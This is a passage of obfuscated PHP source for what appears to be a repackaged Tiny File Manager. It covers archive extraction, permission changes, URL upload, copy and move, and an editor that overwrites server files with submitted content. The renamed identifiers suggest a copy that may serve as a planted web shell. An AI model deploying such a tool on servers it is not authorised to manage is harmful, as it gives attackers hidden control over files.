available'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if($zc8){$rca='';if(isset($_POST['tofolder'])){$rca=pathinfo($oc9,PATHINFO_FILENAME);if(te($m70.'/'.$rca,true)){$m70.='/'.$rca;}}if($a92=="zip"){$wc3=new rc4();$k84=$wc3->u30($oc9,$m70);}elseif($a92=="tar"){try{$pcb=new rcc($oc9);if(@$pcb->pcd($m70,null,true)){$k84=true;}else{$k84=false;}}catch(Exception $f7d){$k84=true;}}if($k84){j1e(c3a('Archive unpacked'));}else{j1e(c3a('Archive not unpacked'),'error');}}else{j1e(c3a('File not found'),'error');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_POST['chmod'],$_POST['token'])&&!FM_READONLY&&!FM_IS_WIN){if(!z8($_POST['token'])){j1e(c3a("Invalid Token."),'error');}$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}$u64=$_POST['chmod'];$u64=r13($u64);$u64=str_replace('/','',$u64);if($u64==''||(!is_file($m70.'/'.$u64)&&!is_dir($m70.'/'.$u64))){j1e(c3a('File not found'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}$vce=0;if(!empty($_POST['ur'])){$vce|=0400;}if(!empty($_POST['uw'])){$vce|=0200;}if(!empty($_POST['ux'])){$vce|=0100;}if(!empty($_POST['gr'])){$vce|=0040;}if(!empty($_POST['gw'])){$vce|=0020;}if(!empty($_POST['gx'])){$vce|=0010;}if(!empty($_POST['or'])){$vce|=0004;}if(!empty($_POST['ow'])){$vce|=0002;}if(!empty($_POST['ox'])){$vce|=0001;}if(@chmod($m70.'/'.$u64,$vce)){j1e(c3a('Permissions changed'));}else{j1e(c3a('Permissions not changed'),'error');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}if(!is_dir($m70)){f11(FM_SELF_URL.'?p=');}$gcf=p14(FM_PATH);$td0=is_readable($m70)?scandir($m70):array();$md1=array();$yad=array();$td2=array_slice(explode("/",$m70),-1)[0];if(is_array($td0)&&e16($td2)){foreach($td0 as $u64){if($u64=='.'||$u64=='..'){continue;}if(!FM_SHOW_HIDDEN&&substr($u64,0,1)==='.'){continue;}$jbf=$m70.'/'.$u64;if(@is_file($jbf)&&e16($u64)){$yad[]=$u64;}elseif(@is_dir($jbf)&&$u64!='.'&&$u64!='..'&&e16($u64)){$md1[]=$u64;}}}if(!empty($yad)){natcasesort($yad);}if(!empty($md1)){natcasesort($md1);}if(isset($_GET['upload'])&&!FM_READONLY){i38();v34(FM_PATH);function z4(){$ed3=explode(',',FM_UPLOAD_EXTENSION);if(FM_UPLOAD_EXTENSION&&$ed3){array_walk($ed3,function(&$vd4){$vd4=".$vd4";});return r5(',',$ed3);}return '';}?>
    <?php m7('css-dropzone');?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php echo p2d();?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php echo c3a('UploadingFiles')?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php echo c3a('Upload from URL')?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo c3a('Back')?></a>
                    <strong><?php echo c3a('DestinationFolder')?></strong>: <?php echo g1c(s20(FM_PATH))?>
                </p>

                <form action="<?php echo htmlspecialchars(FM_SELF_URL).'?p='.g1c(FM_PATH)?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php echo g1c(FM_PATH)?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php echo g1c(FM_PATH)?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php echo c3a('Upload')?></button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php m7('js-dropzone');?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php echo UPLOAD_CHUNK_SIZE;?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php echo MAX_UPLOAD_SIZE;?>",
            acceptedFiles : "<?php echo z4()?>",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    let _response = JSON.parse(res.xhr.response);

                    if(_response.status == "error") {
                        toast(_response.info);
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
    <?php d39();exit;}if(isset($_POST['copy'])&&!FM_READONLY){$ed5=isset($_POST['file'])?$_POST['file']:null;if(!is_array($ed5)||empty($ed5)){j1e(c3a('Nothing selected'),'alert');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}i38();v34(FM_PATH);?>
    <div class="path">
        <div class="card <?php echo p2d();?>">
            <div class="card-header">
                <h6><?php echo c3a('Copying')?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo g1c(FM_PATH)?>">
                    <input type="hidden" name="finish" value="1">
                    <?php foreach($ed5 as $bd6){echo '<input type="hidden" name="file[]" value="'.g1c($bd6).'">'.PHP_EOL;}?>
                    <p class="break-word"><strong><?php echo c3a('Files')?></strong>: <b><?php echo r5('</b>, <b>',$ed5)?></b></p>
                    <p class="break-word"><strong><?php echo c3a('SourceFolder')?></strong>: <?php echo g1c(s20(FM_ROOT_PATH.'/'.FM_PATH))?><br>
                        <label for="inp_copy_to"><strong><?php echo c3a('DestinationFolder')?></strong>:</label>
                        <?php echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo g1c(FM_PATH)?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php echo c3a('Move')?></label></p>
                    <p>
                        <b><a href="?p=<?php echo urlencode(FM_PATH)?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo c3a('Cancel')?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo c3a('Copy')?></button> 
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php d39();exit;}if(isset($_GET['copy'])&&!isset($_GET['finish'])&&!FM_READONLY){$f9f=$_GET['copy'];$f9f=r13($f9f);if($f9f==''||!file_exists(FM_ROOT_PATH.'/'.$f9f)){j1e(c3a('File not found'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}i38();v34(FM_PATH);?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php echo g1c(s20(FM_ROOT_PATH.'/'.$f9f))?><br>
            <strong>Destination folder:</strong> <?php echo g1c(s20(FM_ROOT_PATH.'/'.FM_PATH))?>
        </p>
        <p>
            <b><a href="?p=<?php echo urlencode(FM_PATH)?>&amp;copy=<?php echo urlencode($f9f)?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH)?>&amp;copy=<?php echo urlencode($f9f)?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH)?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php echo c3a('Select folder')?></i></p>
        <ul class="folders break-word">
            <?php if($gcf!==false){?>
                <li><a href="?p=<?php echo urlencode($gcf)?>&amp;copy=<?php echo urlencode($f9f)?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php }foreach($md1 as $pae){?>
                <li>
                    <a href="?p=<?php echo urlencode(trim(FM_PATH.'/'.$pae,'/'))?>&amp;copy=<?php echo urlencode($f9f)?>"><i class="fa fa-folder-o"></i> <?php echo s20($pae)?></a></li>
                <?php }?>
        </ul>
    </div>
    <?php d39();exit;}if(isset($_GET['settings'])&&!FM_READONLY){i38();v34(FM_PATH);global $w59,$b5b,$p61;?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo p2d();?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-cog"></i>  <?php echo c3a('Settings')?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo c3a('Cancel')?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php echo c3a('Language')?></label>
                        <div class="col-sm-5">
                            <select class="form-select" id="js-language" name="js-language">
                                <?php function f6($fd7){global $b5b;return($b5b==$fd7)?'selected':'';}foreach($p61 as $td8=>$kd9){echo"<option value='$td8' ".f6($td8).">$kd9</option>";}?>
                            </select>
                        </div>
                    </div>
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php echo c3a('ErrorReporting')?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php echo $f5e?'checked':'';?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php echo c3a('ShowHiddenFiles')?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php echo $v5d?'checked':'';?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php echo c3a('HideColumns')?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php echo $o5f?'checked':'';?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php echo c3a('Theme')?></label>
                        <div class="col-sm-5">
                            <select class="form-select w-100" id="js-3-0" name="js-theme-3">
                                <option value='light' <?php if($q60=="light"){echo "selected";}?>><?php echo c3a('light')?></option>
                                <option value='dark' <?php if($q60=="dark"){echo "selected";}?>><?php echo c3a('dark')?></option>
                            </select>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php echo c3a('Save');?></button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php d39();exit;}if(isset($_GET['help'])){i38();v34(FM_PATH);global $w59,$b5b;?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo p2d();?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php echo c3a('Help')?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo c3a('Cancel')?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager <?php echo VERSION;?></a></h3></p>
                        <p>Author: Prasath Mani</p>
                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers[at]gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/wiki" target="_blank"><i class="fa fa-question-circle"></i> <?php echo c3a('Help Documents')?> </a> </li>
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/issues" target="_blank"><i class="fa fa-bug"></i> <?php echo c3a('Report Issue')?></a></li>
                                <?php if(!FM_READONLY){?>
                                <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php echo c3a('Generate new password hash')?></a></li>
                                <?php }?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php echo c3a('Generate new password hash')?></label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php echo c3a('Password')?></label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php echo c3a('Password')?>" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php echo c3a('Generate')?></button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php d39();exit;}if(isset($_GET['view'])){$u64=$_GET['view'];$u64=r13($u64,false);$u64=str_replace('/','',$u64);if($u64==''||!is_file($m70.'/'.$u64)||in_array($u64,$GLOBALS['exclude_items'])){j1e(c3a('File not found'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}i38();v34(FM_PATH);$xda=FM_ROOT_URL.s20((FM_PATH!=''?'/'.FM_PATH:'').'/'.$u64);$q72=$m70.'/'.$u64;$a92=strtolower(pathinfo($q72,PATHINFO_EXTENSION));$cdb=x10($q72);$ddc=u18($q72);$rdd=w19($ddc);$qde=false;$kdf=false;$ze0=false;$we1=false;$qe2=false;$je3=false;$te4=false;$te5='File';$oe6=false;$xe7='';$p4f=strtolower(FM_DOC_VIEWER);if($p4f&&$p4f!=='false'&&in_array($a92,d29())){$te4=true;}elseif($a92=='zip'||$a92=='tar'){$qde=true;$te5='Archive';$oe6=m1b($q72,$a92);}elseif(in_array($a92,t23())){$ze0=true;$te5='Image';}elseif(in_array($a92,d25())){$we1=true;$te5='Audio';}elseif(in_array($a92,l24())){$qe2=true;$te5='Video';}elseif(in_array($a92,y26())||substr($cdb,0,4)=='text'||in_array($cdb,j27())){$je3=true;$xe7=file_get_contents($q72);}?>
    <div class="row">
        <div class="col-12">
            <p class="break-word"><b><?php echo c3a($te5)?> "<?php echo g1c(s20($u64))?>"</b></p>
            <p class="break-word">
                <?php $ae8=v15($q72);?>
                <strong><?php echo $ae8['label'];?>:</strong> <?php echo $ae8['path'];?><br>
                <strong>File size:</strong> <?php echo($ddc<=1000)?"$ddc bytes":$rdd;?><br>
                <strong>MIME-type:</strong> <?php echo $cdb ?><br>
                <?php if(($qde||$kdf)&&$oe6!==false){$ae9=0;$dea=0;$web=0;foreach($oe6 as $gec){if(!$gec['folder']){$ae9++;}$dea+=$gec['compressed_size'];$web+=$gec['filesize'];}?>
                    <?php echo c3a('Files in archive')?>: <?php echo $ae9 ?><br>
                    <?php echo c3a('Total size')?>: <?php echo w19($web)?><br>
                    <?php echo c3a('Size in archive')?>: <?php echo w19($dea)?><br>
                    <?php echo c3a('Compression')?>: <?php echo round(($dea/max($web,1))*100)?>%<br>
                    <?php }if($ze0){$yed=getimagesize($q72);echo '<strong>'.c3a('Image size').':</strong> '.(isset($yed[0])?$yed[0]:'0').' x '.(isset($yed[1])?$yed[1]:'0').'<br>';}if($je3){$yee=i1f($xe7);if(function_exists('iconv')){if(!$yee){$xe7=iconv(FM_ICONV_INPUT_ENC,'UTF-8//IGNORE',$xe7);}}echo '<strong>'.c3a('Charset').':</strong> '.($yee?'utf-8':'8 bit').'<br>';}?>
            </p>
            <div class="d-flex align-items-center mb-3">
                <form method="post" class="d-inline ms-2" action="?p=<?php echo urlencode(FM_PATH)?>&amp;dl=<?php echo urlencode($u64)?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                    <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php echo c3a('Download')?></button> &nbsp;
                </form>
                <b class="ms-2"><a href="<?php echo g1c($xda)?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php echo c3a('Open')?></a></b>
                <?php if(!FM_READONLY&&($qde||$kdf)&&$oe6!==false){$vef=pathinfo($q72,PATHINFO_FILENAME);?>
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($u64);?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php echo c3a('UnZip')?></button>
                    </form>&nbsp;
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($u64);?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo g1c($vef)?>"><i class="fa fa-check-circle"></i> <?php echo c3a('UnZipToFolder')?></button>
                    </form>&nbsp;
                    <?php }if($je3&&!FM_READONLY){?>
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($u64)?>" class="edit-file"><i class="fa fa-pencil-square"></i> <?php echo c3a('Edit')?>
                        </a></b> &nbsp;
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($u64)?>&env=ace"
                            class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php echo c3a('AdvancedEditor')?>
                        </a></b> &nbsp;
                <?php }?>
                <b class="ms-2"><a href="?p=<?php echo urlencode(FM_PATH)?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo c3a('Back')?></a></b>
            </div>
            <?php if($te4){if($p4f=='google'){echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url='.g1c($xda).'" frameborder="no" style="width:100%;min-height:460px"></iframe>';}else if($p4f=='microsoft'){echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src='.g1c($xda).'" frameborder="no" style="width:100%;min-height:460px"></iframe>';}}elseif($qde){if($oe6!==false){echo '<code class="maxheight">';foreach($oe6 as $gec){if($gec['folder']){echo '<b>'.g1c($gec['name']).'</b><br>';}else{echo $gec['name'].' ('.w19($gec['filesize']).')<br>';}}echo '</code>';}else{echo '<p>'.c3a('Error while fetching archive info').'</p>';}}elseif($ze0){if(in_array($a92,array('gif','jpg','jpeg','png','bmp','ico','svg','webp','avif'))){echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="'.g1c($xda).'" alt="image" class="preview-img"></label></p>';}}elseif($we1){echo '<p><audio src="'.g1c($xda).'" controls preload="metadata"></audio></p>';}elseif($qe2){echo '<div class="preview-video"><video src="'.g1c($xda).'" width="640" height="360" controls preload="metadata"></video></div>';}elseif($je3){if(FM_USE_HIGHLIGHTJS){$qf0=array('shtml'=>'xml','htaccess'=>'apache','phtml'=>'php','lock'=>'json','svg'=>'xml',);$zf1=isset($qf0[$a92])?'lang-'.$qf0[$a92]:'lang-'.$a92;if(empty($a92)||in_array(strtolower($u64),l28())||preg_match('#\.min\.(css|js)$#i',$u64)){$zf1='nohighlight';}$xe7='<pre class="with-hljs"><code class="'.$zf1.'">'.g1c($xe7).'</code></pre>';}elseif(in_array($a92,array('php','php4','php5','phtml','phps'))){$xe7=highlight_string($xe7,true);}else{$xe7='<pre>'.g1c($xe7).'</pre>';}echo $xe7;}?>
        </div>
    </div>
    <?php d39();exit;}if(isset($_GET['edit'])&&!FM_READONLY){$u64=$_GET['edit'];$u64=r13($u64,false);$u64=str_replace('/','',$u64);if($u64==''||!is_file($m70.'/'.$u64)||in_array($u64,$GLOBALS['exclude_items'])){j1e(c3a('File not found'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}$ff2=' : <i><b>'.$u64.'</b></i>';header('X-XSS-Protection:0');i38();v34(FM_PATH);$xda=FM_ROOT_URL.s20((FM_PATH!=''?'/'.FM_PATH:'').'/'.$u64);$q72=$m70.'/'.$u64;$af3=true;if(isset($_GET['env'])){if($_GET['env']=="ace"){$af3=false;}}if(isset($_POST['savedata'])){$n73=$_POST['savedata'];$a74=fopen($q72,"w");@fwrite($a74,$n73);fclose($a74);j1e(c3a('File Saved Successfully'));}$a92=strtolower(pathinfo($q72,PATHINFO_EXTENSION));$cdb=x10($q72);$rdd=filesize($q72);$je3=false;$xe7='';if(in_array($a92,y26())||substr($cdb,0,4)=='text'||in_array($cdb,j27())){$je3=true;$xe7=file_get_contents($q72);}?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php if(!$af3){?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php echo c3a('Fullscreen')?>"><i class="fa fa-expand" title="<?php echo c3a('Fullscreen')?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php echo c3a('Search')?>"><i class="fa fa-search" title="<?php echo c3a('Search')?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php echo c3a('Undo')?>"><i class="fa fa-undo" title="<?php echo c3a('Undo')?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php echo c3a('Redo')?>"><i class="fa fa-repeat" title="<?php echo c3a('Redo')?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php echo c3a('Word Wrap')?>"><i class="fa fa-text-width" title="<?php echo c3a('Word Wrap')?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php echo c3a('Select Document Type')?>" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- <?php echo c3a('Select Mode')?> --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="<?php echo c3a('Select Theme')?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo c3a('Select Theme')?> --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php echo c3a('Select Font Size')?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo c3a('Select Font Size')?> --</option></select>
                        </div>
                    <?php }?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <a title="<?php echo c3a('Back')?>" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;view=<?php echo urlencode($u64)?>"><i class="fa fa-reply-all"></i> <?php echo c3a('Back')?></a>
                <a title="<?php echo c3a('BackUp')?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php echo urlencode(trim(FM_PATH))?>','<?php echo urlencode($u64)?>')"><i class="fa fa-database"></i> <?php echo c3a('BackUp')?></a>
                <?php if($je3){?>
                    <?php if($af3){?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($u64)?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php echo c3a('AdvancedEditor')?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo g1c($xda)?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php }else{?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($u64)?>"><i class="fa fa-text-height"></i> <?php echo c3a('NormalEditor')?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo g1c($xda)?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo c3a('Save')?>
                        </button>
                    <?php }?>
                <?php }?>
            </div>
        </div>
        <?php if($je3&&$af3){echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">'.htmlspecialchars($xe7).'</textarea>';echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  && e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';}elseif($je3){echo '<div id="editor" contenteditable="true">'.htmlspecialchars($xe7).'</div>';}else{j1e(c3a('FILE EXTENSION HAS NOT SUPPORTED'),'error');}?>
    </div>
    <?php d39();exit;}if(isset($_GET['chmod'])&&!FM_READONLY&&!FM_IS_WIN){$u64=$_GET['chmod'];$u64=r13($u64);$u64=str_replace('/','',$u64);if($u64==''||(!is_file($m70.'/'.$u64)&&!is_dir($m70.'/'.$u64))){j1e(c3a('File not found'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}i38();v34(FM_PATH);$xda=FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$u64;$q72=$m70.'/'.$u64;$vce=fileperms($m70.'/'.$u64);?>
    <div class="path">
        <div class="card mb-2 <?php echo p2d();?>">
            <h6 class="card-header">
                <?php echo c3a('ChangePermissions')?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    <?php $ae8=v15($q72);?>
                    <?php echo $ae8['label'];?>: <?php echo $ae8['path'];?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo g1c(FM_PATH)?>">
                    <input type="hidden" name="chmod" value="<?php echo g1c($u64)?>">

                    <table class="table compact-table <?php echo p2d();?>">
                        <tr>
                            <td></td>
                            <td><b><?php echo c3a('Owner')?></b></td>
                            <td><b><?php echo c3a('Group')?></b></td>
                            <td><b><?php echo c3a('Other')?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo c3a('Read')?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php echo($vce&00400)?' checked':'' ?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php echo($vce&00040)?' checked':'' ?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php echo($vce&00004)?' checked':'' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo c3a('Write')?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php echo($vce&00200)?' checked':'' ?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php echo($vce&00020)?' checked':'' ?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php echo($vce&00002)?' checked':'' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo c3a('Execute')?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php echo($vce&00100)?' checked':'' ?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php echo($vce&00010)?' checked':'' ?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php echo($vce&00001)?' checked':'' ?>></label></td>
                        </tr>
                    </table>

                    <p>
                       <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>"> 
                        <b><a href="?p=<?php echo urlencode(FM_PATH)?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php echo c3a('Cancel')?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo c3a('Change')?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php d39();exit;}i38();v34(FM_PATH);j35();$gf4=count($yad);$kf5=count($md1);$pf6=0;$lf7=(FM_THEME=="dark")?"text-white bg-dark table-dark":"bg-white";?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php echo g1c(FM_PATH)?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php echo $lf7;?>" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php if(!FM_READONLY):?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
